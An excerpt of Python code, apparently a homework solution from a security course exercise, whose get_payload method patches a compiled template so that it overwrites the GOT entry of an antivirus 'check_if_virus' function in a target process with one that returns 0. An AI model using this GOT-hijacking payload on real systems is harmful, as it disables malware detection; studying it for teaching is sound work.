12       def get_payload(self, pid): 
13           # Return a payload that will replace the GOT entry for check_if_virus 
14           # with another function of a similar signature, that will return 0. 
15           # 1. You can assume we already compiled q3.c into q3.template. 
16           # 2. Use CHECK_IF_VIRUS_GOT and CHECK_IF_VIRUS_ALTERNATIVE. 
17           with open(TEMPLATE_PATH, 'rb') as reader: 
18               payload_template = reader.read() 
19    
20           # convert the address to bytes before lookup 
21           anti_pid_holder_bytes = address_to_bytes(ANTI_PID_HOLDER) 
22           check_virus_holder_bytes = address_to_bytes(CHECK_VIRUS_GOT_HOLDER) 
23           replace_virus_holder_bytes = address_to_bytes(REPLACE_VIRUS_HOLDER) 
24    
25           # find and replace with the real value in the .text segment of the template binary 
26           pid_addr = payload_template.find(anti_pid_holder_bytes) 
27           check_virus_addr = payload_template.find(check_virus_holder_bytes) 
28           replace_virus_addr = payload_template.find(replace_virus_holder_bytes) 
29    
30           payload = payload_template 
31           payload = payload[:pid_addr] + address_to_bytes(pid) + payload[pid_addr+4:] 
32           payload = payload[:check_virus_addr] + address_to_bytes(CHECK_IF_VIRUS_GOT) + payload[check_virus_addr+4:] 
33           payload = payload[:replace_virus_addr] + address_to_bytes(CHECK_IF_VIRUS_ALTERNATIVE) + payload[replace_virus_addr+4:] 
34    
35           return payload
